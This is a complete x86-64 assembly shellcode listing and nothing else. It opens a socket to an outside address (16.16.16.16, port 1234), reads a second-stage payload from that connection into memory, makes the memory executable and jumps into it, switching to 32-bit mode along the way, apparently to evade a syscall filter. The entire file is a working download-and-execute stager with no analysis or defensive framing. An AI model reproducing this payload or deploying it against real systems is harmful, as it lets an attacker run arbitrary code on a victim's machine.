BITS 64

	push 0x10101010                         ; Address 
        push word 0xd204                        ; Port
        push word 2                             ; Address family - AF_INET (0x2)
        push 42                                 ; connect syscall
        push byte 16                            ; length
        push byte 41                            ; socket syscall
        push byte 1                             ; type - SOCK_STREAM (0x1)
        push byte 2                             ; family - AF_INET (0x2)

        pop rdi                                 ; family
        pop rsi                                 ; type
        xor rdx, rdx                            ; protocol
        pop rax                                 ; socket syscall
        syscall

        mov rdi, rax                            ; sockfd
        pop rdx                                 ; length
        pop rax                                 ; connect syscall
        mov rsi, rsp                            ; sockaddr
        syscall

	push 1					; dup2 syscall
        pop rsi
        mov al, 33
        syscall

	mov dl, 0xff
	push 0x6b6000
	pop rsi
	xor eax, eax				; read to bss
	syscall

	mov al, 10
	push rsi
	pop rdi
	push 0x1000
	pop rsi
	mov dl, 0x7				; make bss executable
	syscall

	xor rsp, rsp
	mov esp, 0x6b6500
	mov dword [esp+4] , 0x23
	mov dword [esp] , 0x6b6000		; jump to bss and switch mode
	retf
